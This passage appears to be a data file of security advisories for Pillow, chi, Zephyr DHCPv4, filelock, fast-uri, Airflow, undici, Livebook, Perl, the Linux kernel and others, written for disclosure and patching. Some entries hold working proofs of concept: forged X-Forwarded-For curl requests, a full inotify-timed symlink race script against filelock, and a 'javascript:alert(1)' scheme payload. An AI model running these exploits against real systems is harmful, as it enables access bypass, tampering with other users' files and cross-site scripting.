os.environ["PILLOW_ALIGNMENT"] = "64"

from PIL import Image

# Image A: 64 px wide, so its rows fill the whole aligned stride
a = Image.new("L", (64, 40), 0x41).transpose(Image.Transpose.FLIP_LEFT_RIGHT)
del a

# Image B: 61 px wide, so each row has 3 bytes of padding; its pixels are all 0
b = Image.new("L", (61, 40), 0).transpose(Image.Transpose.FLIP_LEFT_RIGHT)

try:
    exported = Image.fromarrow(b, b.mode, b.size).tobytes()
except ValueError as e:
    print("Not vulnerable:", e)
else:
    if leaked := len(exported) - exported.count(0):
        raise RuntimeError(f"{leaked} of {len(exported)} exported bytes are not B's pixels")
```

### Impact

Information disclosure for applications that set `PILLOW_ALIGNMENT` and export images to Arrow. Likely any image whose row length isn't a multiple of the alignment will do. In a service handling several users' images, one user's exported data can contain pixels from another user's image, or other stale heap contents.

items.summary:
### Summary

`ClientIPFromXFF` skips any `X-Forwarded-For` entry in a configured trusted CIDR but never verifies that the direct TCP peer in `http.Request.RemoteAddr` belongs to that CIDR. A client that can reach the Go server directly can therefore append a trusted-looking proxy address and choose the client IP returned by `middleware.GetClientIP`.

The attack is remote and requires one unauthenticated HTTP request with no user interaction (AV:N/AC:L/PR:N/UI:N). It changes security decisions and exposes one protected handler within the same application (S:U/C:L/I:L); no availability loss was observed (A:N).

**Preconditions:** The application uses `ClientIPFromXFF` and makes the origin server reachable by an anonymous client outside the configured trusted-proxy CIDRs. No victim interaction is required.

1. Send `GET /admin` directly to the origin with no `X-Forwarded-For` header.
2. Observe a `403 Forbidden` response and an empty derived client IP.
3. Repeat the request with `X-Forwarded-For: 10.0.0.7, 198.51.100.42`.
4. Observe `200 OK` and `client-ip="10.0.0.7"`. Expected: the untrusted direct peer prevents the forwarding chain from being accepted.

### Details

The vulnerable code is `ClientIPFromXFF` in `middleware/client_ip.go`, lines 93-116 at the tested revision. It calls `walkXFF` with only the attacker-controlled header, skips every entry that matches a trusted prefix, and stores the first remaining address:

```go
walkXFF(r.Header[xForwardedForHeader], func(v string) bool {
	ip, ok := parseHeaderAddr(v)
	if !ok {
		return true
	}
	if inAnyPrefix(ip, prefixes) {
		return false
	}
	found = ip
	return true
})
```

The function does not parse `r.RemoteAddr` before this walk. Consequently, the configured CIDRs identify trusted strings inside `X-Forwarded-For`, but do not establish that the immediate sender is one of those trusted proxies.

### Proof of concept

Using Go 1.24 or later, create and run this minimal application against the tested revision:

```sh
mkdir chi-clientip-poc
cd chi-clientip-poc
go mod init clientip-poc
go get github.com/go-chi/chi/v5@167e1e3bd039d060696b99c8da4e876ae04f42c1
cat > main.go <<'EOF'
package main

import (
	"fmt"
	"log"
	"net/http"

	"github.com/go-chi/chi/v5"
	"github.com/go-chi/chi/v5/middleware"
)

const allowedIP = "10.0.0.7"

func main() {
	r := chi.NewRouter()
	r.Use(middleware.ClientIPFromXFF("198.51.100.0/24"))
	r.Get("/admin", func(w http.ResponseWriter, r *http.Request) {
		clientIP := middleware.GetClientIP(r.Context())
		if clientIP != allowedIP {
			http.Error(w, fmt.Sprintf("denied: tcp-peer=%q client-ip=%q", r.RemoteAddr, clientIP), http.StatusForbidden)
			return
		}
		fmt.Fprintf(w, "allowed: tcp-peer=%q client-ip=%q\n", r.RemoteAddr, clientIP)
	})

	log.Print("listening on http://127.0.0.1:3001")
	log.Fatal(http.ListenAndServe("127.0.0.1:3001", r))
}
EOF
go run .
```

The no-header control was rejected:

```console
$ curl --http1.1 -i http://127.0.0.1:3001/admin
HTTP/1.1 403 Forbidden
Content-Type: text/plain; charset=utf-8
X-Content-Type-Options: nosniff
Date: Tue, 06 Oct 2026 15:46:27 GMT
Content-Length: 48

denied: tcp-peer="127.0.0.1:54416" client-ip=""
```

Adding the forged chain authorized the same direct client:

```console
$ curl --http1.1 -i -H 'X-Forwarded-For: 10.0.0.7, 198.51.100.42' http://127.0.0.1:3001/admin
HTTP/1.1 200 OK
Date: Tue, 06 Oct 2026 15:46:33 GMT
Content-Length: 57
Content-Type: text/plain; charset=utf-8

allowed: tcp-peer="127.0.0.1:54417" client-ip="10.0.0.7"
```

### Impact

items.summary:
The DHCPv4 client in subsys/net/lib/dhcpv4/dhcpv4.c maintained its transaction identifier (iface->config.dhcpv4.xid) as a counter rather than as a per-transaction random value. It was seeded once with sys_rand32_get() in dhcpv4_start_internal(), incremented by one in dhcpv4_send_discover() and dhcpv4_send_decline(), and never changed by dhcpv4_send_request() — so every RENEWING and REBINDING exchange reused, unchanged, the identifier that had already appeared on the wire in the broadcast DHCPDISCOVER at boot, and where the identifier did move it moved predictably by one. RFC 2131 4.1 requires a single identifier per transaction, chosen so that clients are unlikely to collide.

This identifier is the client's only unpredictable reply-validation token. net_dhcpv4_input() accepts a BOOTP reply on op, a matching xid, and a matching chaddr (the interface MAC, which is public); the UDP callback is registered with a wildcard remote address and port, and no server-identifier or source-address check is applied. An attacker who learns one identifier — for example any host on the same segment that sees the broadcast DHCPDISCOVER, or a DHCP server or relay on a network the device previously joined — therefore retains a valid token for the device's whole uptime, and can predict the identifiers of later exchanges, without having to observe the unicast renew traffic or race the legitimate server.

A forged reply that passes those checks has effect regardless of client state, because dhcpv4_parse_options() applies its side effects before the state machine gate in dhcpv4_handle_reply(): the router option calls net_if_ipv4_set_gw() and the DNS option calls dns_resolve_reconfigure(). A single accepted datagram can thus repoint the device's default gateway and resolvers at attacker-controlled addresses, redirecting its traffic; during RENEWING or REBINDING a forged DHCPACK re-binds the lease with attacker-chosen parameters and a forged DHCPNAK removes the address and restarts configuration.

The fix draws a fresh sys_rand32_get() value at each point where a transaction begins — entering SELECTING, RENEWING and REBINDING, and at the INIT/INIT-REBOOT entry taken when an interface with a lease goes down — while REQUESTING and DECLINE keep the identifier of the exchange they belong to, as RFC 2131 requires. As a side effect the client also no longer discards a slow server's offer after retransmitting a discover, and the initial-discover backoff now draws its own randomness instead of deriving it from the identifier.

items.summary:
When a soft-lock stale break finds that the marker (the lock file at `<path>`) it renamed aside was a live one recreated by a successor, the restore branch of `break_lock_file()` checks the break name with `lstat` (a check that reads a name without following a symbolic link) and then calls `os.link(break_path, lock_file)` by name. On CPython 3.12 and later on Linux (and on macOS) that call follows a symbolic link (a file that redirects to another path). A local user (the other user below) who can write a shared lock directory without the sticky bit (a directory flag that lets only a file's owner rename or remove it) replaces the break name with a symbolic link between those two calls.

The `SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease` or `lifetime` break of the user running the lock (the lock user below) then creates a hard link (a second name for the same file), in that directory, to any of the lock user's own files on the same filesystem. That includes files inside directories the other user cannot enter and links that `fs.protected_hardlinks` (a Linux setting that forbids hard links to files one does not own) refuses the other user when it asks itself. The link exposes the file's size, times, mode and owner, keeps the inode (the kernel's identity for a file, independent of its name) alive, and gives the other user a name it can move. On 4.2.0 a later `FileLock` of the lock user on that name truncated the file. Affected versions: filelock >= 4.1.0 and <= 4.2.0 (finding `ANT-2026-SB29HIAL`).

## Severity

**CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:N, 5.3 (Medium).**

`AV:L` (local): the other user needs an account on the same host. `AC:H` (high attack complexity): two short races against a few lines of Python, timed by inotify (a Linux facility that reports file events), and the lock user must take the lock again and again (the scanner won 10 runs out of 10 after 9 to 910 lock cycles). `PR:L` (low privileges): an unprivileged account is enough. `UI:N` (no user interaction): the lock user's process acts on its own. `C:L` (low confidentiality impact): the file's metadata through the new name, not its content. `I:H` (high integrity impact): the other user chooses the file, and whatever the lock user later does to names in that directory lands on it. On 4.2.0 the lock user's own `FileLock` truncated the 17-byte private file to 0 bytes and, with a permissive `mode`, would have changed its mode too. `A:N` (no availability impact): the lock keeps working.

Classification from the review: security, conditional on a shared parent without the sticky bit, which crosses the protected-directory boundary. The scanner rated it high (CWE-363). This is an earlier-public-context finding. #786 added the restore branch and guarded a symbolic link already present when `lstat` runs, not one swapped in after it.

## Scope and preconditions

- The other user can write the lock directory, and it has no sticky bit: a `0777` or group-writable cache or project directory. In a root-owned `1777` directory the unprivileged lock user cannot rename the other user's marker and only waits. In a `1777` directory the lock user owns, `fs.protected_symlinks=1` (a Linux setting that refuses to follow another user's symbolic link in a world-writable sticky directory) makes the `link` fail with `EACCES` (permission denied). Testing showed no effect in sticky directories.
- The interpreter's `os.link` follows symbolic links. CPython 3.14 on Linux issues `linkat(..., AT_SYMLINK_FOLLOW)`. CPython 3.11 issues `link(2)`, which links the symbolic link itself, and is not affected. The scanner did not test 3.12 and 3.13. On macOS `link(2)` follows (confirmed in our review on macOS 27.0.1: a plain `os.link` of a symbolic link gave the target `st_nlink` 2, that is two names).
- The target file and the lock directory are on the same filesystem (hard links cannot cross filesystems), and the lock user takes the lock more than once.
- Every soft-lock path reaches the branch: `SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease` and the `lifetime` break. The native `FileLock` does not, but it is the consumer that turns the planted link into a truncation.

filelock's checks against another local user hold only when no other user can replace the lock's directory or any of its ancestors. That is the case when each ancestor belongs to the lock user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it, which no file-based lock can defend against. This finding is about what the lock itself adds inside such a directory, a hard link the other user cannot make on its own.

## Affected code

At the scanned commit b831496, the restore branch of [`break_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_util.py#L113-L122) runs for [`SoftFileLock._try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123), [`MarkerSoftFileLock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_marker.py#L74-L81), [`SoftFileLease`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_lease.py#L229-L256) and the [`lifetime` break](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1576-L1588). The truncation in [`UnixFileLock._finalize_locked_fd`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_unix.py#L150-L154) is what a later native lock on the planted name did to the file (reported in its own advisory).

## Introduced

fc73fc51e137 ("fix(soft): restore a live marker a stale break moved aside", #786, 2026-10-08), first released in 4.1.0 (verified against the tags). Releases before 4.1.0 have no restore branch, so this does not affect them.

## Mechanism

```python
# src/filelock/_util.py:115-122
break_path: Final[str] = f"{lock_file}.break.{os.getpid()}.{secrets.token_hex(16)}"
Path(lock_file).rename(break_path)
if (st_after := os.lstat(break_path)).st_mtime <= mtime_before and st_after.st_ino == ino_before:
    Path(break_path).unlink()
elif stat.S_ISREG(st_after.st_mode) and _HAS_LINK:  # pragma: needs hard-link
    with suppress(FileExistsError):
        os.link(break_path, lock_file)
        Path(break_path).unlink()
```

The `S_ISREG` test (is it a regular file) is about what `lstat` saw on line 117, not about what `link` resolves on line 121. The docstring says the code must not put a symbolic link back "because `link` would follow a symlink to its target", and the test at the scanned commit names the consequence ("publish the victim file's inode at the lock path"), but that test only covers a symbolic link that is already there when `lstat` runs. The 128-bit token stops others from guessing the break name, not from reading it. The name is in the directory listing from the moment the rename has happened. The package's other links pass `follow_symlinks=False` where the runtime honours it; this one does not. An `strace` (a tool that logs a process's system calls) on CPython 3.14.8 shows `os.link(a, b)` as `linkat(AT_FDCWD, a, AT_FDCWD, b, AT_SYMLINK_FOLLOW)`.

The other user plays both the stale holder and the "successor" the branch exists for:

1. The other user leaves a genuine marker of a dead process at the lock path (a forked child takes the lock and `_exit`s). The lock user's `_try_break_stale_lock()` reads it and `owner_is_stale()` agrees, so `break_lock_file()` renames it to `app.lock.break.<pid>.<token>`. In a directory without the sticky bit the lock user may rename a file it does not own.
2. The other user still owns that file and gives it a newer mtime (modification time) after the `lstat` on line 113. Line 117 then takes it for a recreated marker, and line 119 sees a regular file.
3. The other user renames a symbolic link to the lock user's private file over the break name.
4. Line 121 resolves the link with the lock user's credentials, so `app.lock` becomes a second hard link to the private file. Line 122 removes the symbolic link.

The other user's own `os.link()` on the private file fails with `EACCES` (it cannot enter the `0700` directory). On a file of the lock user it can reach, `fs.protected_hardlinks=1` answers `EPERM` (operation not permitted). The lock user would evict the odd "marker" after `MALFORMED_LOCK_AGE_THRESHOLD` (2 s), so the other user moves it to another name first, which the non-sticky directory allows. Both steps are races against a few lines of Python. There are about 40 µs between the `lstat` on line 113 and the one on line 117 (half of it the `rename`), and about 2 µs between line 117 and the `os.link()` call. inotify tells the other user when to act. A watch reports the lock user closing the marker after reading it, then the rename together with the break name. A bump that comes before line 113 costs nothing, since line 113 returns and the lock user looks again on its next poll.

## Reproduction

The scanner's reproducer for finding `ANT-2026-SB29HIAL`, as received, ran against commit b831496b0273ecd11bf02b8d080ca8b673a538c1. The `repro` script drives the files under `repro.d/`.

import ctypes
import os
import random
import struct
import sys
import time

from filelock import SoftFileLock

lock_path, victim_file, kept_name = sys.argv[1:]
os.chdir(os.path.dirname(lock_path))
lock_name = os.path.basename(lock_path).encode()
IN_NONBLOCK, IN_CLOSE_NOWRITE, IN_MOVED_TO = 0o4000, 0x10, 0x80


def spin(microseconds):
    until = time.perf_counter() + microseconds / 1e6
    while time.perf_counter() < until:
        pass


# The bytes of a genuine marker of a dead process.
if os.fork() == 0:
    crashed_holder = SoftFileLock(lock_path)
    crashed_holder.acquire()
    os._exit(0)
os.wait()
with open(lock_name, "rb") as marker_file:
    stale_marker = marker_file.read()
os.unlink(lock_name)

libc = ctypes.CDLL(None)
inotify = libc.inotify_init1(IN_NONBLOCK)
libc.inotify_add_watch(inotify, b".", IN_MOVED_TO)
marker_mtime = 1_000_000_000
lock_cycles = 0
while True:
    lock_cycles += 1
    os.symlink(victim_file, b"symlink")
    marker = os.open(b"staged", os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o644)
    os.write(marker, stale_marker)
    os.utime(marker, (marker_mtime, marker_mtime))
    marker_watch = libc.inotify_add_watch(inotify, b"staged", IN_CLOSE_NOWRITE)
    while True:  # plant it as soon as the victim has released the lock
        try:
            os.link(b"staged", lock_name)
            break
        except FileExistsError:
            pass
    os.unlink(b"staged")

    break_name = None
    while break_name is None:
        try:
            events = os.read(inotify, 4096)
        except BlockingIOError:
            continue
        while events and break_name is None:
            _, mask, _, name_length = struct.unpack_from("iIII", events)
            name = events[16 : 16 + name_length].rstrip(b"\0")
            events = events[16 + name_length :]
            if mask & IN_CLOSE_NOWRITE:
                # The victim has read the marker and is about to judge it stale and lstat it again. A bump that comes
                # before that lstat only makes the victim start over on its next poll.
                spin(random.uniform(40, 100))
                marker_mtime += 1
                os.utime(marker, (marker_mtime, marker_mtime))
            elif name.startswith(lock_name + b".break."):
                # The victim has renamed the marker and is about to lstat the break name and link it back.
                os.rename(b"symlink", name)
                break_name = name
    libc.inotify_rm_watch(inotify, marker_watch)
    os.close(marker)

    time.sleep(0.001)
    try:
        at_lock_path = os.lstat(lock_name)
        if at_lock_path.st_uid != os.getuid() and at_lock_path.st_nlink == 2:
            os.rename(lock_name, kept_name)
            print(f"after {lock_cycles} lock cycles the victim linked its file here as {kept_name!r}:", at_lock_path)
            break
    except FileNotFoundError:
        pass
    for leftover in (b"symlink", break_name):
        if os.path.lexists(leftover):
            os.unlink(leftover)
    try:
        os.read(inotify, 65536)
    except BlockingIOError:
        pass

## Attack sequence

```mermaid
sequenceDiagram
    participant X as other local user (uid 1001)
    participant D as /tmp/shared-locks (0777, not sticky)
    participant V as SoftFileLock of the lock user (uid 1000)
    participant K as ~victim/private/signing.key (0600 in a 0700 dir)
    X->>D: child takes app.lock and _exit()s: dead-holder marker owned by X
    V->>D: read marker, owner_is_stale, lstat ok: rename app.lock to app.lock.break.*
    rect rgb(255, 214, 214)
        X->>D: inotify sees the rename: utime the break file (newer mtime)
        V->>D: lstat break name: mtime newer, S_ISREG: treat as a recreated live marker
        X->>D: rename a symbolic link to signing.key over the break name
        V->>K: os.link(break name, app.lock) follows the symbolic link: app.lock is a second name of the file
        X->>D: rename app.lock to other.lock before the 2 s eviction
        Note over V,K: the lock user's FileLock("other.lock") on 4.2.0 truncates the file to 0 bytes
    end
```

## Evidence

The scanner's reproducer takes about 5 s and is deterministic. Root creates `/home/victim/private` (`0700`) with `signing.key` (17 bytes, `0600`) and `/tmp/shared-locks` (`0777`, no sticky bit), with `fs.protected_hardlinks = 1` and `fs.protected_symlinks = 1`. In the control step, the `attacker` account runs `os.link(key, /tmp/shared-locks/by-attacker)` and gets `Permission denied`. Then the `attacker` child leaves `app.lock held by pid 253 which has exited`. The `victim` account runs `with SoftFileLock(path)` under `strace -P ... -e inject=rename:delay_exit=2000000 -e inject=linkat:delay_enter=2000000`, which holds it 2 s after its `rename()` and 2 s before its `linkat()` without changing any call. The `attacker` account bumps the break file, swaps in the symbolic link, and renames `app.lock` to `other.lock`.

The result line reads `signing.key: links=2, names in /tmp/shared-locks with its inode: ['other.lock']`, and after the `victim` account's second program takes `FileLock('/tmp/shared-locks/other.lock')`, `size=0`. Verdict `BUG`. The unpaused variant (`unpaused_victim.py` looping on the lock, `unpaused_attacker.py` timing both steps with inotify) won 10 runs out of 10 on the 2-CPU image after 9 to 910 lock cycles (1 to 65 s); one run won after 128 cycles (8 s).

Our review: BUG on 4.2.0 (triage), OK on the head of #843. On macOS 27.0.1 (CPython 3.13.16) a plain `os.link` of a symbolic link follows it (target `st_nlink` 2) while `follow_symlinks=False` links the symbolic link itself, which confirms the report's macOS note.

## Impact

A local user who can write a lock directory that has no sticky bit makes a user of a soft lock in that directory create a hard link there to one of that user's own files on the same filesystem, including files inside directories the other user cannot enter. The content stays unreadable, but the other user now reads size, times, mode and owner of the file through the new name, keeps the inode alive after the lock user deletes or rotates the file, and holds what `fs.protected_hardlinks` exists to deny, a name it can move around for someone else's file.

Whatever the lock user later does to names in that directory lands on the file, and filelock 4.2.0 was such a consumer itself. `UnixFileLock._finalize_locked_fd()` ran `os.ftruncate(fd, 0)` on whatever regular file `O_NOFOLLOW` let it open. The other user moved the link to `other.lock`, the lock user took `FileLock("other.lock")`, and the 17-byte private file became 0 bytes. The other user can also move the link into sticky `/tmp` on the same filesystem before the lock user locks it there, and a `FileLock` with a permissive `mode` such as `0o666` applied that mode to the private file too, after which the other user could write its content.

On its own, without such a second lock, the result is the link and the metadata above. The other user has to win two short races and needs the lock user to take the lock more than once. Not affected: sticky directories on the tested settings, CPython 3.11 on Linux, releases before 4.1.0.

## Workarounds

Keep soft locks out of directories other users can write without the sticky bit; a `0700` directory of the lock's user, or a sticky directory, is not affected. On CPython 3.11 on Linux the swap has no effect. Do not take a native `FileLock` on a name another user controls.

items.summary:
### Impact

`fast-uri` percent-decodes the scheme component with the legacy global `unescape()` before validating it, so an input whose decoded scheme is a valid but dangerous token is emitted as a live scheme. RFC 3986 section 3.1 does not allow percent-encoding in a scheme, so no RFC or WHATWG parser treats such input as having that scheme, but `fast-uri` does.

For example, `normalize('%6Aavascript:alert(1)')` returns `javascript:alert(1)`, `resolve('https://a.example/', '%6Aavascript:alert(1)')` returns `javascript:alert(1)`, and `parse('%6Aavascript:alert(1)').scheme` returns `javascript`. The `%uXXXX` form (`%u006Aavascript:`) produces the same result, and `equal('%68ttp://a/', 'http://a/')` returns `true`.

An application that screens dangerous schemes on the raw input and then stores or renders `normalize(input)` or `resolve(base, input)` turns an inert string into an executable `javascript:`, `data:`, or `vbscript:` URL, a stored or reflected cross-site scripting vector in the consuming application. `equal()` also treats an encoded and a plain scheme as the same, which can bypass equality-based allowlists.

### Patches

Upgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.

### Workarounds

Reject input whose scheme part (before the first `:`, and before any `/`, `?`, or `#`) contains `%`. Alternatively, check `parse(x).scheme` against an allowlist after normalization and use that same parsed result rather than the raw string.

items.summary: Apache Airflow's environment-variable secrets backend resolved a team-scoped Connection or Variable from the wrong team's scope. The guard meant to prevent this only ran when no team scope was supplied, and its pattern could not match a team name containing an underscore, which team names are allowed to contain. When the guard did not apply, the lookup fell through to an unconditional global read that resolved the stored `AIRFLOW_CONN__<TEAM>___<ID>` variable regardless of which team asked. In multi-team mode an authenticated user of one team could therefore have `POST /api/v2/connections/test` resolve another team's Connection and authenticate outward with that team's credentials; the endpoint uses the credentials rather than returning them. Exploitation requires `[core] multi_team` enabled, `[core] test_connection` set to `Enabled` (it ships `Disabled`), team-scoped secrets provisioned as environment variables in the API-server process, and knowledge of the encoded identifier. Redirecting the test at an attacker-controlled host is separately blocked. Users are advised to upgrade to apache-airflow 3.3.1 or later.

items.summary: Heimdall is a cloud native Identity Aware Proxy and Access Control Decision service. Prior to version 0.17.17, when the trusted_proxies option is configured, heimdall extracts client IP addresses from the Forwarded (for= parameter) and X-Forwarded-For headers and exposes them as Request.ClientIPAddresses to the rule pipeline. However, extracted values are not validated to be syntactically valid IP addresses. Arbitrary strings, malformed IP literals, and RFC 7239 unknown values and obfuscated identifiers are accepted without further checks. In addition, the Forwarded header parser splits on , and ; without accounting for RFC 7239 quoted strings, which can cause a single quoted value to be parsed as multiple entries, with fragments — including trailing quote characters — treated as independent addresses. This issue has been patched in version 0.17.17.

In the Linux kernel, the following vulnerability has been resolved:

af_packet: Don't cast tpacket_hdr.tp_len to int in tpacket_parse_header().

syzbot reported BUG() in sock_sendmsg_nosec(). [0]

The problem is that tpacket_parse_header() casts user-provided
tpacket_hdr.tp_len, which is u32, to int.

If the length is larger than INT_MAX, the following condition
in tpacket_parse_header() passes,

  if (unlikely(tp_len > size_max))

and any negative value can be returned to the caller, up to
sock_sendmsg_nosec().

The repro set tpacket_hdr.tp_len to 0xfffffdef, which is cast
to -EIOCBQUEUED (-529), triggering BUG() in sock_sendmsg_nosec().

  *(uint64_t*)0x200000000008 = 0xfffffdef;
  ...
  syscall(__NR_write, /*fd=*/r[0], /*buf=*/0x200000000000ul, /*count=*/1ul);

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

staging: fbtft: make dirty_lock IRQ-safe

fbtft_mkdirty() can be reached from the fbcon rendering path while
processing printk() in hardirq context. Meanwhile, dirty_lock is also
taken by fbtft_deferred_io() in workqueue context with local interrupts
enabled.

Lockdep reports a possible IRQ lock inversion involving dirty_lock and
console_owner. A hardirq can interrupt a CPU holding dirty_lock and
enter the console rendering path, which can attempt to acquire
dirty_lock again.

The following lockdep report was observed on an RK3566 system with
CONFIG_PROVE_LOCKING enabled:

  WARNING: possible irq lock inversion dependency detected
  swapper/2/0 just changed the state of lock:
  (console_owner){-...}-{0:0}
  but this lock took another, HARDIRQ-unsafe lock in the past:
  (&par->dirty_lock){+.+.}-{2:2}

  CPU0                    CPU1
  ----                    ----
  lock(&par->dirty_lock);
                         local_irq_disable();
                         lock(console_owner);
                         lock(&par->dirty_lock);
  <Interrupt>
    lock(console_owner);

  *** DEADLOCK ***

Use spin_lock_irqsave() for fbtft_mkdirty() and spin_lock_irq() for
fbtft_deferred_io(). They only access the dirty line range, so the
IRQ-off regions remain short.

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

btrfs: detach failed sprout device from transaction update list

When creating the first metadata chunk for a sprout filesystem,
create_chunk() adds the new device to the transaction dev_update_list
through device->post_commit_list.

If the subsequent system chunk creation fails, btrfs_init_new_device()
aborts the transaction and releases the device while post_commit_list is
still linked. This triggers a warning in btrfs_free_device() and leaves
the transaction list referencing freed memory.

Detach the device while holding chunk_mutex before releasing it.

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

btrfs: restore active device pointers after failed sprout

btrfs_init_new_device() switches latest_dev and possibly s_bdev from the
seed device to the new sprout device before creating the first writable
chunks.

If chunk creation or the subsequent sprout setup fails, the error path
releases the new device without switching those pointers back.
btrfs_show_devname() can then dereference the freed latest_dev and crash.

Restore the active device pointers to the latest seed device before
removing and releasing the failed sprout device.

items.summary:
Server-Side Request Forgery vulnerability in malach-it Boruta allows an unauthenticated remote attacker to cause the OAuth/OpenID authorization server to issue outbound HTTP requests to attacker-chosen URIs, including internal services and cloud metadata endpoints.

Three code paths fetch remote URIs supplied by the requester without sufficient validation of the target. Boruta.Oauth.Request.Base.fetch_unsigned_request/1 in lib/boruta/oauth/request/base.ex dereferences the OAuth request_uri parameter from the authorization request via Finch.build(:get, request_uri) |> Finch.request(OpenIDHttpClient). Boruta.Openid.parse_registration_params/2 in lib/boruta/openid.ex dereferences the jwks_uri supplied in an OpenID Connect dynamic client registration request. Boruta.Ecto.Clients.refresh_jwk_from_jwks_uri/1 in lib/boruta/adapters/ecto/clients.ex later refreshes the stored jwks_uri for an existing client. In all three paths the only validation is that the URI parses with a scheme (and one of the two request_uri clauses does not even restrict the scheme to http or https). The implementations do not require HTTPS, do not enforce a host or IP allowlist, do not reject loopback, private, link-local, or other non-public ranges after DNS resolution, do not cap response size, and do not constrain redirects. An attacker can therefore steer the server's HTTP client at arbitrary network targets reachable from the Boruta host.

This issue affects boruta: from 2.3.2 before 2.3.7.

items.summary:
### Impact

undici's `EventSource` client can be driven to exhaust process memory by a malicious or compromised Server-Sent Events peer. By sending millions of tiny completed `data:` fields with no blank event separator, or a single unfinished line split across many chunks, the parser retains a growing amount of per-field and per-chunk state. The byte-based `maxEventSize` and `maxResponseSize` limits do not bound that retained state, and `maxResponseSize` is enforced on the compressed body before decompression, so a small compressed response can expand into enough retained memory to terminate the process. The application only needs to maintain an `EventSource` connection to an untrusted peer, which controls only the response. Availability is the only impact.

### Patches

Upgrade to `6.29.1`, `7.30.1`, or `8.12.2`, which bound the retained EventSource parser state (the number of `data` fields and buffered chunks, the unfinished-line length, and per-field byte totals) independently of the byte limits.

### Workarounds

None.

items.summary:
### Impact

undici's `fetch()` verifies Subresource Integrity (SRI) metadata by looking up the algorithm token in a lowercase-only set, but the SRI specification defines a valid token by its ASCII-lowercase form. A correct but non-lowercase token such as `SHA256-...` or `Sha256-...` is therefore treated as unknown and skipped. When no recognized algorithm remains, undici treats the integrity list as empty and accepts the response, so a server that returns a body different from the pinned digest passes the check.

An application that pins a response with a valid uppercase or mixed-case SRI token receives attacker-controlled bytes with no integrity error. The attacker needs only to control the response body, not the application's integrity metadata. The issue affects response integrity only. The regression was introduced in undici 7.15.0; releases 7.14.0 and earlier lowercase the token and are not affected.

### Patches

Upgrade to `7.30.1` or `8.12.2`. undici now normalizes the algorithm token to ASCII lowercase before validating it and before selecting the strongest algorithm, so case variants of SHA-256, SHA-384, and SHA-512 are verified correctly.

### Workarounds

Use lowercase algorithm tokens (`sha256`, `sha384`, `sha512`) in `integrity` metadata.

items.summary:
Improper Neutralization of Special Elements used in an OS Command (OS Command Injection) vulnerability in livebook-dev livebook allows command injection into generated deployment setup commands.

LivebookWeb.Hub.Teams.DeploymentGroupAgentComponent.docker_instructions/2 and LivebookWeb.Hub.Teams.DeploymentGroupAgentComponent.fly_instructions/4 in lib/livebook_web/live/hub/teams/deployment_group_agent_component.ex interpolate deployment group environment variable values into the generated Docker and Fly.io setup commands without shell escaping. The values originate from the deployment group configuration and reach the sinks through Livebook.Hubs.Dockerfile.online_docker_info/3.

Both sinks place the value inside a double-quoted shell word, so a value containing a command substitution such as $(...) or backticks is evaluated by the shell without any need to break out of the quoting, and a literal double quote terminates the quoted word and allows arbitrary further tokens. The generated command is displayed in the Livebook web interface with a copy button, so a user who copies it and runs it without reviewing it first executes the injected commands on their own machine, under their own account.

An attacker requires privileges sufficient to set deployment group environment variables, while the resulting code execution occurs on the machine of whoever runs the generated command. The Kubernetes instructions are not affected, because they render the same values into a YAML manifest with escaping rather than into a shell command.

This issue affects livebook: from 0.13.0 before 0.18.7 and from 0.19.0 before 0.19.9.

items.summary:
Perl versions through 5.45.1 have out-of-bounds heap reads and writes during regular expression matching via an undersized superlinear cache in S_regmatch.

The regex engine's superlinear cache holds one bit per subject position for each participating WHILEM node, so the bit count is the subject length plus one times the number of nodes. Nothing checks that product for positive overflow of the signed 32-bit count: a 286331153 byte subject matched against a pattern with 15 participating nodes stores the count as 14, leaving a two byte cache. The cache is then indexed from the real match position and node number, so reads go past the end of the allocation, and on failure CACHEsayNO sets a bit past it.

A caller that matches an attacker controlled subject of this size against a pattern of this shape can crash the process or corrupt heap memory.

items.summary:
The DHCPv4 client helper net_dhcpv4_msg_type_name() in subsys/net/lib/dhcpv4/dhcpv4.c indexes a static 8-element const char * name table after a faulty bounds check. The guard used msg_type <= sizeof(name) instead of msg_type <= ARRAY_SIZE(name); sizeof returns the byte size of the pointer array (32 on 32-bit, 64 on 64-bit targets) rather than the element count of 8, so message-type values from 9 up to that byte size pass the check and cause name[msg_type - 1] to read past the end of the array.

The msg_type value originates from the DHCP MESSAGE TYPE option, which is read as an unchecked raw byte from a received packet (net_pkt_read_u8) and passed unmodified into the lookup. A DHCP server, or any host able to inject a spoofed DHCP reply onto the client's link, can therefore drive the index out of bounds. The out-of-range slot yields a garbage const char * that is then dereferenced by a %s log conversion.

The lookup is reached only from a debug log statement (NET_DBG / LOG_DBG), so the out-of-bounds read is triggerable only when the DHCPv4 log module is built at DEBUG level (CONFIG_NET_DHCPV4_LOG_LEVEL_DBG), which is not the default configuration. When that condition holds, the result is an out-of-bounds read and a wild-pointer dereference: most likely a crash of the DHCP client (denial of service) and potentially disclosure of an adjacent pointer's contents through the log output. The fix replaces sizeof with ARRAY_SIZE, restoring the correct 1..8 acceptance window.

A flaw in Node.js TLS hostname verification allows a certificate with only a DNS SAN to authenticate an IP endpoint when the client connects using a non-canonical IPv4 spelling, such as `0177.0.0.1`, `0x7f.0.0.1`, `2130706433` or `127.1`.

